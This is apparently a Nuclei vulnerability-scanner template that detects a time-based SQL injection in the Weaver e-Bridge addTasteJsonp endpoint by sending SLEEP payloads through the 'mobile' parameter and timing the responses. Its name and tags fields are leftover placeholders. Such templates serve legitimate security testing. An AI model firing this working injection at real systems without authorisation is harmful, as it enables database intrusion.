id: e-Bridge-addTasteJsonp-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 泛微-云桥e-Bridge addTasteJsonp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息.
  reference:
    - https://mp.weixin.qq.com/s/Ej26hywx4po4sj3dSAVI_Q
  tags: tags
  
variables:
  username: "{{rand_base(6)}}"  
http:
  - method: GET
    path:
      - "{{BaseURL}}/taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%283%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI"
      - "{{BaseURL}}/taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%286%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI"
      - "{{BaseURL}}/taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%289%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"